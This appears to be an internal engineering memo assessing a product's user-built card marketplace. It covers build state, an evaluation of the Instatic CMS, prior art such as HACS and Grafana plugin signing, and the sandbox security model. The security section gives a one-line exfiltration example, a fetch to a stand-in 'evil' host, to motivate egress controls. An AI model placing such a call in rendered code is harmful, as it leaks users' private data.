# Dive: user-built UI — (A) public websites vs (B) marketplace renderers, + the Instatic verdict

Date 2026-09-07. Read-only dive. Every codebase claim below was read in source; every
external claim carries a URL and a tag.

---

## 0. The headline

**(B) is not a feature to build. It is a substrate that is already ~85% shipped, and the
last rung of it landed TODAY (2026-09-07).** Author → preview → bind → package → publish →
install → render-instead-of-default all exist, with one-door services, tripwires and a
sandbox. The founder's ask for (B) is **expose and finish**, not build. There is exactly
one ABSENT rung (an agent cannot publish) and two honest PARTIALs.

**(A) is the genuinely new surface** — and the pod already contains the hardest security
primitive it needs (`GET /api/hub/public/projection`, unauthenticated, default-deny,
facet-scoped, field-whitelisted). What is missing is everything above that line: a page
model, rendering, hosting, domains, SEO. That is a product, not a feature.

**Instatic: MIT, real, hot, and four months old with one author.** 8,489 stars, 779 forks,
132 open issues, created 2026-04-30, last push 2026-09-05 — and of 26 contributors,
DavidBabinec has 1,134 commits while the second-place contributor has 9. Verdict below is
**take-the-idea, and watch it** — not adopt.

---

## 1. Deliverable 1 — the (B) build-state table

All `file:line` are VERIFIED by reading the file.

| Rung | State | Evidence |
|---|---|---|
| **Author a card** | **SHIPPED** | `browser/electron/renderer/src/apps/CellStudioApp.tsx` — 1,471 lines, "Three-pane IDE for building, previewing, and saving frame cells" (`:4-7`). Backend one-door `synap-backend/packages/api/src/services/cells/define-cell.ts:1-9` — "SINGLE SOURCE OF TRUTH for the AI-generated cell create path, used by BOTH the Hub REST route (`POST /cells/define`) AND the MCP `synap_create_cell` verb." Route at `packages/api/src/routers/hub-protocol/rest/cells.ts:236`. |
| **Author it by AI** | **SHIPPED** | MCP `synap_create_cell` is one of only two cell-related MCP tools in `packages/api/src/routers/mcp/tools/mcp-tools.manifest.json`. CellStudio's right pane is an "AI helper" (`CellStudioApp.tsx:7`). |
| **Preview it** | **SHIPPED** | Live sandboxed `ViewFrame` preview, 700 ms debounce code→preview (`CellStudioApp.tsx:632`, render at `:1007-1036`). Preview injects the `--synap-*` token sheet so it matches the product (`:89-96`, `:1030`). |
| **Bind it to a kind** | **SHIPPED (today)** | Canonical store `renderer_bindings` — `packages/database/migrations/0243_renderer_bindings.sql`, schema `packages/database/src/schema/renderer-bindings.ts`. Resolution ladder, most-specific-first: `user·object → user·kind → workspace·object → workspace·kind → pod·object → pod·kind → (3 legacy stores) → hardcoded fallback`. Read rung in `packages/database/src/services/profile-resolution-service.ts` (`getEffectiveRendererWithSource`). |
| **…through one write door** | **SHIPPED** | `packages/api/src/services/profiles/set-profile-renderer.ts` (304 lines) — one path shared by the governed Hub route, the `profile/renderer.set` proposal executor, the tRPC override door, and MCP `synap_promote_cell_to_renderer` (`:1-8`). Legacy mirror is time-boxed behind one named flag `MIRROR_LEGACY_RENDERER_STORES` (`:76-80`). Authz split out to `renderer-binding-authz.ts`. Tripwires: `__tripwires__/renderer-binding-scope-reaches-resolver.test.ts`, `renderer-binding-revoked-is-a-tombstone.test.ts`, `renderer-slot-enum-parity.tripwire.test.ts`. |
| **Bind by AI, governed** | **SHIPPED** | MCP `synap_promote_cell_to_renderer` → same door; proposal executor `packages/api/src/routers/proposals/executors/profile.ts` materialises on approval, with `source_proposal_id` lineage on the binding row. |
| **The on-ramp** | **SHIPPED** | The "Design this card" affordance the North Star §5 asks for exists: default card `synap-app/packages/core/entity-card/src/components/EntityMinimalCard.tsx:7-10`; the inline generate→preview→promote loop is `browser/.../cells/ProfileRendererSettingsCell.tsx:207` ("inline generate → preview → promote loop"), `:522`, `:1212`. |
| **Package it** | **SHIPPED** | `cell` is one of six CP `PACKAGE_TYPES` — `workspace, capability, skill, workflow, view, cell` — pinned by SSOT test `synap-control-plane-api/src/db/package-vocabulary.test.ts:41-48`. It is also a first-class `dependencies[].kind` that actually installs, unlike three of its siblings: `synap-backend/packages/database/src/utils/package-definition.ts:191` — `cell` → `applyMarketInstall({kind:'cell'})` → `defineCell`, while `automation/skill/workflow/view` are "ACCEPTED but surfaced as `required-absent`" (`:193-196`). |
| **Publish it — human** | **SHIPPED** | Browser `electron/renderer/src/components/views/PublishWizard.tsx` (937 lines), 4 steps, `category` constrained to `PACKAGE_TYPES` (`:647-651`, `:690`). CLI: `synap market scaffold / validate / publish / unpublish` (`synap-cli/src/index.ts:2334,2359,2370,2386`) plus `synap cell define` / `cell build <entry>` (`:1943,:1992`). CP write door `synap-control-plane-api/src/seeds/publish-package-core.ts`. |
| **Publish it — agent** | **ABSENT** | The MCP manifest exposes exactly two cell tools — `synap_create_cell` and `synap_promote_cell_to_renderer`. There is **no `synap_publish_package`**. An agent can author a card, promote it to be the pod's renderer for a kind, and install someone else's — but can never publish its own. This is the one true hole in (B), and it is the hole that decides whether the marketplace fills with agent-authored cards or stays hand-fed. |
| **Distribute it** | **PARTIAL** | Catalog sync pulls cells from a dedicated endpoint `GET {source}/api/marketplace/cells` (`packages/jobs/src/workers/cp-catalog-sync.ts:15,302-348`), carrying `code`, `deps`, `previewCode`, `defaultSize`, `configSchema`, `viewTypes`. **But cell is the ONLY kind that hard-requires a local cache row**: `packages/api/src/services/capabilities/marketplace-install.ts:301-311` — "its renderer source is inline-only … the by-slug packages endpoint doesn't serve cells" — so a by-slug install of a cell that is not in the cache **throws** and tells you to `market.search` again. Honest failure, not a silent one, but it means cell install is cache-coupled in a way the other five kinds are not. |
| **Install it** | **SHIPPED** | `POST /api/hub/cells/install` (`rest/cells.ts:107`); kind-aware routing in the browser via `browser/electron/renderer/src/utils/installRoute.ts` — a TOTAL `Record<PackageType, MarketInstallKind>` with `cell: 'cell'` (`:60-67`), so a seventh CP type cannot compile without a decision. Guarded by `browser/.../__tripwires__/market-install-kind-parity.test.ts`, which source-scans the CLI's third copy of the same map. **That tripwire's own header records the CLI copy as already stale** (omits `skill` and `view`) — a live, known drift. |
| **Render instead of default** | **SHIPPED** | `synap-app/packages/core/cell-runtime/src/IframeWidgetCell.tsx:198` — `sandbox="allow-scripts"`, deliberately **without** `allow-same-origin` (`:4-5`, `:63`). postMessage protocol in `iframe-protocol.ts`. npm deps are spliced into an esm.sh import map, validated *inside the one door* by name/version regexes so no caller can reach the upsert with unvalidated deps (`define-cell.ts:16-40`, ≤30 entries). |

### The severance check you asked for

I looked specifically for zero-producer / zero-consumer breaks, the class this project keeps hitting.

- **A stale comment that reads as a severance but is not one.** `renderer-bindings.ts:8-13` and the migration header both say "**INERT ON ARRIVAL** … there is no writer, so the table is empty on every pod". That is no longer true — `set-profile-renderer.ts` writes it through `setRendererBinding`, and nine browser files consume the resolution. The comment is a stale artefact of the previous wave and should be corrected before it misleads the next reader (it briefly misled me).
- **A real, deliberate refusal, not a gap.** The write door **refuses any non-null `subjectId` unconditionally, for every scope** (`set-profile-renderer.ts:28-32`; test `set-profile-renderer.subject-id-refused.test.ts`). The read rungs for per-object bindings exist and stay; only the write is closed. The recorded reason (`renderer-bindings.ts:31-45`) is a founder decision of 2026-09-07 taken after checking six systems — Salesforce Lightning page assignment, ServiceNow view rules, Dynamics forms, VS Code editor associations, Notion, Backstage — "every one of them stops layout/renderer assignment at the class (kind) and refuses a per-instance override." **This independently reproduces the earlier dive's finding that no product ships per-single-object layouts, and closes that anti-pattern in code rather than in prose.**
- **The genuine zero-producer:** agent publish (above).

**Read of the table: (B) is ~85% built.** The remaining 15% is one MCP tool, one cache-coupling cleanup, one stale-comment correction, and the CLI kind-map drift the tripwire already names.

---

## 2. Deliverable 2 — the Instatic verdict

Repo: <https://github.com/CoreBunch/Instatic> · site <https://instatic.com>

### Facts first (VERIFIED, GitHub REST API, fetched 2026-09-07)

| | |
|---|---|
| **License** | **MIT** — permissive, not blocking |
| Stars / forks / watchers | 8,489 / 779 / 60 |
| Open issues | 132 |
| Created | **2026-04-30** (four months old) |
| Last push | 2026-09-05 (two days ago) |
| Language | TypeScript |
| Contributors | 26 total — **DavidBabinec 1,134 commits; #2 has 9; #3 has 8**; the remaining 23 have 1–3 |
| Archived / fork | no / no |

Recent commit titles show real engineering, not a demo: `test(e2e): repair two specs left behind by security fixes (#492)`, `feat(plugin-sdk): ingest managed media from plugins (#487)`, `fix(site-import): honour alt text, script order, folders, and re-import`.

**Read on maintenance: it is actively and competently maintained by essentially one person.**
8.5k stars in four months is a strong signal of demand and a weak signal of durability. The
bus factor is 1. The README itself says it is "version 0.0.x" with APIs that "can still
shift before 1.0."

### What it actually is (VERIFIED from the README)

A **self-hosted visual CMS + page builder + publisher in one Bun server** — positioned as
"the open-source alternative to Webflow, Framer and WordPress." Not a static site
generator in the Astro/Eleventy sense; it is a full CMS with a canvas editor.

- **Stack**: Bun runtime with `Bun.serve` and a custom router; TypeScript throughout;
  admin UI is React 19 + Vite; database **SQLite (default) or Postgres**.
- **Content model**: a universal store — "Pages, posts, components, custom collections, and
  any structured table you invent all live in the same store: `data_tables` and `data_rows`."
- **Publishing**: pages are "baked straight to disk when you publish and swapped in
  atomically" — build-time output, runtime server. Deploy via one-click Railway/Render, or
  Docker/VPS with Caddy TLS.
- **Plugins**: **sandboxed with QuickJS-WASM** — "no filesystem, no environment variables,
  no network at all unless the site owner grants it", backend code in per-plugin workers.
  Plugins can add HTTP routes, storage, scheduled jobs, **loop data sources**, canvas
  modules, and media adapters.

### The integration question

**There is a seam, and it is the one you would want: "loop data sources".** A plugin can
expose a data source that the editor's loops iterate over. A Synap plugin would call the
pod's Hub REST from a per-plugin worker with a granted network capability, and the pod's
typed entities would appear as a collection the visual editor binds to. That is the
adoption story on paper.

**Three things make it a fork rather than a plug-in in practice (INFERRED, from the
architecture as described — I did not read the plugin SDK source):**

1. **Instatic wants to own the content model.** `data_tables`/`data_rows` is a competing
   entity store. Synap's whole thesis is that the pod *is* the typed store. You would be
   running two schemas and reconciling them, or reducing Synap to a read-only feed — which
   throws away kinds, facets, property-def scoping and governance at the site boundary.
2. **The auth boundary is inverted.** Instatic assumes the CMS holds the data and publishes
   a subset. Synap's constraint is the opposite: the pod holds private data and must expose
   a default-deny projection. Synap's `public/projection` is the correct shape; a plugin
   with granted network access to the pod's authenticated Hub REST is not.
3. **Bun.** Every Synap service is Node + Hono. Adopting Instatic adds a second runtime to
   the deploy surface.

### Honest verdict: **take-the-idea. Do not adopt, do not vendor.**

MIT means you *could* vendor it; the bus factor of 1 and the 0.0.x API mean you should not
build a product surface on it four months in. What is genuinely worth stealing, and is
cheap to steal:

- **QuickJS-WASM + per-plugin worker + capability-granted network** is a better third-party
  code posture than an iframe for anything server-side, and it is directly applicable to
  (B) if cells ever grow a server half.
- **Bake to disk and swap atomically.** If (A) is ever built, this is the right publish
  model — not server-side rendering of live pod data on every request, which is exactly the
  failure mode Super.so was built to fix in the Notion ecosystem (below).
- **"Clean enough to read in view-source"** as the product promise. That is a positioning
  line, and it is a good one.

It is *not* a thin wrapper around something standard — the QuickJS sandbox and the canvas
editor are real work. It is simply too young and too single-authored to depend on.

---

## 3. Deliverable 3 — prior art

### (A) Publishing a database as a website

| Product | Mechanics | Price | What breaks |
|---|---|---|---|
| **Notion Sites** | Publish pages from the workspace; one free `*.notion.site` domain (up to 5 on paid) | **Custom domain is a paid add-on: $10/mo monthly, $8/mo annual, on top of a paid plan** ([Notion help](https://www.notion.com/help/connect-a-custom-domain-with-notion-sites)) | Notion "does not let you build full websites — you can only publish individual pages" ([Super](https://super.so/blog/notion-sites-and-super)) |
| **Super.so / Potion** | Sit on top of Notion; **build a static version** of the content | ~$12–16/mo | Exists *because* Notion's own publishing was insufficient; competitors that "rely on Notion in real time to render pages" are "slow and vulnerable" — Super's differentiator is precisely that it does not ([Super](https://super.so/blog/notion-sites-and-super), [Nick Lafferty](https://nicklafferty.com/reviews/best-notion-website-builders/)) |
| **Obsidian Publish** | Select notes from a vault; hosted with links, backlinks, graph view | **$10/site/mo, $8/mo annual — priced PER SITE** ([review](https://makerstack.co/reviews/obsidian-publish-review/)) | One vault per site; "design control is constrained, and power users who want pixel-level control will feel boxed in"; no analytics |
| Airtable Interfaces + share links | Read-only shared views of a base | included | Not a website; no domains, no SEO |
| Astro / Eleventy content collections | Typed content at build time, from files or an API | free | Requires an engineer; no visual authoring |

**Three things this prior art actually tells you:**

1. **People do pay for this, and they pay per-site.** Obsidian Publish and Notion's domain
   add-on are both roughly **$8–10/site/month** — remarkably close to Synap's own hypothesised
   $12–19/mo pod price. A "publish your pod" add-on has a defensible, observed price point.
2. **What gets published is documentation, digital gardens, wikis, personal sites** — not
   e-commerce, not community sites. The founder's list (project page, personal site,
   community site, **e-commerce**) is two-thirds inside the proven band and one-third
   outside it. E-commerce needs carts, payments, inventory and PCI scope; nothing in the
   pod points that way.
3. **The static-bake is not an optimisation, it is the architecture.** Super.so's entire
   existence is the proof: live-rendering a private database on every public request is
   "slow and vulnerable". Instatic reached the same conclusion independently ("baked
   straight to disk … swapped in atomically"). If (A) is built, build it as a bake.

### (B) User-contributed UI in a marketplace — HACS in detail

**How a Home Assistant custom Lovelace card works** (VERIFIED,
[Sergio Carracedo's walkthrough](https://sergiocarracedo.es/ha-custom-cards/); the official
`home-assistant.io/dashboards/custom-cards/` URL 404s):

1. **It is a Web Component.** `class MessageCard extends HTMLElement` then
   `customElements.define("message-card", MessageCard)`.
2. **It declares itself into a global array**, not a manifest:
   ```js
   window.customCards = window.customCards || [];
   window.customCards.push({ type: 'message-card', name: 'Message Card', description: '…' });
   ```
3. **It does NOT declare what entity type it renders.** This is the single most important
   mechanical fact for Synap. HA cards are *config-driven, not type-bound*: the user writes
   `type: custom:message-card` in the dashboard YAML and passes whatever entities they like;
   HA calls `setConfig(config)` and the card decides what to do. There is no
   "this card renders `light.*`" declaration anywhere. Which cards fit which entity is
   community folklore in READMEs.
4. **Data arrives by property injection.** HA sets a `hass` property containing "the state
   of the Home Assistant instance, sensors, areas" — the *whole* state object, on every
   update. `getCardSize()` reports layout height.
5. **Loading is a manually-registered dashboard resource** — a URL, typically
   `/local/my-cards/message-card.js` from HA's `www` folder, loaded as a JS module.
6. **The default is overridden by the user typing a different `type:` in YAML.** There is no
   binding table, no scope ladder, no "make this the default for all lights."
7. **Security model: none.** HACS "downloads files and reports releases, but it does not
   guarantee code quality, security, compatibility, or maintainer response time"
   ([HA community](https://community.home-assistant.io/t/risks-involved-with-hacs/671049)).
   The card runs as first-party JavaScript in the HA frontend's own origin with the full
   `hass` object. In January 2021 HACS itself plus five popular custom integrations shipped
   a directory-traversal vulnerability, **CVE-2021-3166**
   ([HA security disclosure 2](https://www.home-assistant.io/blog/2021/01/23/security-disclosure2/)).

**The comparison is flattering to Synap and you should say so out loud.** On the two axes
that matter, Synap is already ahead of the closest working analogue in the world:

| | HACS custom card | Synap cell |
|---|---|---|
| Declares what it renders | **No** — README prose | **Yes** — `content_kind` + `subject_kind` in `renderer_bindings`, `viewTypes` on the definition |
| Override model | user retypes `type:` in YAML | scope ladder user/workspace/pod, revocable via tombstone, proposal-gated |
| Isolation | **none** — first-party origin, full `hass` | cross-origin iframe, `allow-scripts` **without** `allow-same-origin`, postMessage-only |
| Review | none, explicitly disclaimed | governance proposal on the *binding* |

### Grafana, Obsidian, VS Code, Shopify — the other four

- **Grafana panel plugins.** "By default, Grafana requires all plugins to be signed before
  it loads them"; unsigned plugins are neither loaded nor started, and loading one requires
  naming it explicitly in `allow_loading_unsigned_plugins` and produces a server-log
  warning. Signature levels: Core / Commercial / Community (signed by Grafana Labs) /
  Private (self-signed) / Unsigned. PKI over a `MANIFEST.txt` of file checksums.
  ([Grafana docs](https://grafana.com/docs/grafana/latest/administration/plugin-management/plugin-sign/))
  **This is the model to copy if Synap ever opens a community cell marketplace** — signing
  is the cheapest credible answer that is not full code review.
- **Shopify theme app extensions.** Shopify **deprecated** the old model — apps injecting
  JS via the ScriptTag API and writing into theme files via the Asset API — because of
  "leftover code when uninstalling apps, theme update conflicts, and performance opacity
  about which app added which script." The replacement, app blocks, does not edit theme
  code at all; each block is sandboxed, loads only on pages where it is placed, and removes
  cleanly. ([Shopify migration docs](https://shopify.dev/docs/apps/online-store/theme-app-extensions/update),
  [about](https://shopify.dev/docs/apps/build/online-store/theme-app-extensions))
  **This is the strongest vendor-scale evidence that Synap's binding-table design is right
  and HACS's is the legacy shape.** Shopify ran the HACS model at commerce scale and
  migrated off it.
- **VS Code extensions / Obsidian plugins.** Both are "trust the author, run in-process".
  Obsidian plugins get full Node access; VS Code extensions run in a separate extension
  host process but with full API access, and Microsoft's answer to untrusted code is
  Workspace Trust, a *user-consent* gate rather than a technical sandbox. Neither is a
  model to copy for private-data rendering.

---

## 4. Deliverable 4 — the security model required for (B)

The framing in the brief is right: Synap's existing governance layer is a **write**
gate, and this is a **render** trust problem. They are different, and the difference is
that a malicious renderer does not need to write anything — it only needs to see the data
it was handed and get one byte out.

**What is already true (VERIFIED):** a cell renders in a cross-origin iframe with
`sandbox="allow-scripts"` and no `allow-same-origin`, so it cannot touch the parent origin,
cookies, or `localStorage`; it talks to the host only over `postMessage`; and its npm deps
are name/version-validated inside the single write door before they can reach an esm.sh
import map, with CSP pinning the origin. **That is already a stronger posture than HACS,
Obsidian, or VS Code.**

**What is required before opening it to third parties, in priority order:**

1. **Egress control is the actual gap.** `allow-scripts` still permits `fetch()` to
   anywhere the host CSP allows. A cell is handed the entity's data as a prop; exfiltration
   is one `fetch('https://evil/', {body})`. The fix is a **frame-scoped CSP `connect-src`
   defaulting to `'none'`**, widened only by a declared, install-time-visible allowlist.
   NEEDS VERIFICATION — I read the sandbox attribute and the import-map validation but did
   **not** confirm what `connect-src` the frame document ships with. Check this first; it
   is the one finding that could change the answer.
2. **Declare and show the data appetite.** The install dialog must say which fields and
   which relations the cell receives, in the same way the binding already declares
   `content_kind`. Today the cell gets whatever the host passes.
3. **Signing, on the Grafana model.** First-party cells signed by Synap; community cells
   signed by their vendor; unsigned cells refused unless the pod owner names them
   explicitly and takes a logged warning. The `vendor` concept already exists in the
   publish flow, so the identity half is present.
4. **The binding is the governance chokepoint, and it already is one.** Promotion goes
   through a proposal; `revoked_at` is a tombstone so a revocation is auditable history.
   Keep it that way: **never let a package install silently create a pod-scope binding.**
   Installing a cell should make it *available*; a human approving a proposal should make
   it *the default*. Verify this holds for the marketplace install path specifically — the
   `applyMarketInstall` cell branch calls `defineCell`, which is definition only, but the
   package applier writing `views`/`widgets` deserves a second look before any third party
   can publish.
5. **A kill switch.** Pod-wide "disable all non-first-party cells", one setting.

**Does Electron make it harder?** Modestly, and mostly in a direction you control. The
renderer is Chromium, so `sandbox=` and CSP behave normally; the specific risk is that
`browser/` already has a `fetchViaMain` bridge and deep-link handling in the main process,
and *those* must never become reachable from a cell frame. The existing browser security
rules (host allowlist on `fetchViaMain`, loopback blocked, `shell.openExternal` scheme
validation, permission requests only auto-allowed for first-party Synap origins) are
exactly the right posture and should be re-audited with "a hostile cell frame is now inside
the app" as the threat model. NOT FOUND: any existing test asserting a cell frame cannot
reach the main-process bridges.

---

## 5. Deliverable 5 — anti-patterns prior art says are WRONG

1. **Arbitrary third-party JS in the app's own origin.** WRONG, and verified twice over:
   HACS's own posture is an explicit disclaimer of any security guarantee, and it produced
   CVE-2021-3166; Shopify ran the same model at commerce scale via the ScriptTag/Asset APIs
   and **migrated off it**, citing uninstall residue, update conflicts, and inability to
   attribute a script to an app. **Synap already does not do this** — keep it that way, and
   close the `connect-src` gap.
2. **Per-single-object bespoke layouts.** WRONG. Six systems checked and recorded in
   `renderer-bindings.ts:31-45` — Salesforce, ServiceNow, Dynamics, VS Code, Notion,
   Backstage — none ships per-instance layout assignment. Synap's write door refuses it
   unconditionally, with a test. **Already closed; do not reopen it.**
3. **Live-rendering a private database on every public request.** WRONG for (A). Super.so's
   whole business is the correction of this in the Notion ecosystem; Instatic reached the
   same conclusion. Bake and swap.
4. **A pricing/config step the backend does not honour.** Documented *in this codebase*
   (`PublishWizard.tsx:11-24`): a pricing step collected `pricingModel`/`priceUsd`, the CP
   zod schema declared neither, zod stripped both, and every package published free
   regardless of choice. The step was removed rather than faked. That instinct — "a step
   that cannot affect the outcome is worse than no step" — is the one to carry into any
   (A) work.
5. **Untyped template galleries that cannot be composed.** Partly WRONG and partly already
   solved: HA's `window.customCards` entry carries a name and a description and *no type
   binding at all*, which is why matching a card to an entity is folklore. Synap's
   `renderer_bindings(subject_kind, content_kind)` plus `viewTypes` is the typed answer.
   The residual risk is on the *package* side, where three of six `PACKAGE_TYPES`
   (`skill`, `workflow`, `view`) are accepted as dependencies but resolve `required-absent`
   — a gallery entry that cannot be composed is exactly this shape.

---

## 6. Deliverable 6 — recommendation

**Do (B) first. It is three or four weeks of finishing, not a quarter of building, and it
is the only one of the two that is differentiated.**

### What (B) costs from here

| Work | Size |
|---|---|
| Verify + fix the frame `connect-src` egress gap | S — and do it first; it gates everything else |
| `synap_publish_package` MCP tool (the one ABSENT rung) | S — the CP door and the CLI path both exist |
| Correct the stale "INERT ON ARRIVAL" headers on `renderer-bindings.ts` / `0243` | XS |
| Fix the CLI `marketInstallKind` drift the tripwire already names (`skill`, `view`) | XS |
| Decouple cell install from the catalog cache, or make the coupling explicit in the UI | M |
| Install-time data-appetite disclosure + a first-party/third-party distinction in the UI | M |
| Vendor signing on the Grafana model | M–L — needed only when opening to third parties |

Everything above the signing row is *finishing what exists*. Only the last row is new
product. **You can ship a first-party card marketplace — Synap-authored and user-authored
cards, no third-party publishing — without any of the signing work**, because the trust
boundary is the pod owner's own agent, which is already governed.

### What (A) costs, and what it forecloses

(A) is a real product, not a feature. Missing today: a page/route model, public rendering
(the cell runtime is an in-app iframe, not an SSR/static path), a build-and-bake pipeline,
hosting, custom domains + TLS, SEO/meta/sitemap, and a public-facing design system. The one
hard part that is *already done* is the auth boundary: `GET /api/hub/public/projection`
(`packages/api/src/routers/hub-protocol/rest/public-projection.ts`) is unauthenticated,
read-only, **default-deny opt-in** per workspace, **facet-scoped rather than
entity-scoped** — the module's own "security keystone" note explains that filtering on
`entities.workspace_id` would leak the pod's private CRM because `company`/`person` atoms
are pod-wide — field-whitelisted server-side, hard-capped at 50 rows, and 404s rather than
revealing that a non-opted-in workspace exists. That is a genuinely well-designed primitive.
It also has **zero UI producers and zero consumers outside the backend** (`rg` across all
six repos returns only backend files), so nothing today can turn it on.

Prior art says the market for (A) is real but modest and priced per-site at $8–10/mo, and
that what people actually publish is docs, gardens, and personal sites — not the
e-commerce end of the founder's list.

**What doing (A) first would foreclose:** it would spend the quarter that (B) needs to
reach a shipped marketplace, and it would do so on a surface where Synap competes with
Webflow, Framer, Notion Sites, and now Instatic — none of whom it beats on page-building —
rather than on the surface where it beats HACS, Obsidian, and VS Code on the security model
and beats everyone on typed binding. (B) also *feeds* (A): a card that renders one entity is
the same artefact a public page would need, so shipping the card marketplace makes (A)
cheaper later. The reverse is not true.

**Recommendation, stated plainly:** finish (B) to a first-party card marketplace this
quarter; keep `public/projection` warm but unbuilt; revisit (A) only once cards are being
authored and installed by people who are not you — at which point the honest first version
of (A) is "bake a workspace's public projection into a static site", not a page builder.

---

## Appendix — claim tags

VERIFIED by reading source: every `file:line` in §1, the PACKAGE_TYPES tuple, the sandbox
attribute, the `subjectId` refusal, the absence of an MCP publish tool, the
`public/projection` design and its lack of consumers.
VERIFIED by API/doc fetch: every Instatic number in §2 (GitHub REST API, 2026-09-07); the
HACS card mechanics; the Grafana signing model; the Shopify migration rationale; Notion
Sites / Obsidian Publish pricing.
INFERRED: the three reasons Instatic integration is a fork rather than a plug-in (from the
architecture as described; I did not read the plugin SDK source).
NEEDS VERIFICATION: the frame document's `connect-src` CSP — the one open question that
could change the security conclusion.
NOT FOUND: any test asserting a cell frame cannot reach `fetchViaMain` or the deep-link
bridge; any UI that toggles `settings.publicProjection`; Instatic's contributor count and
last-commit date from the README alone (obtained from the API instead).
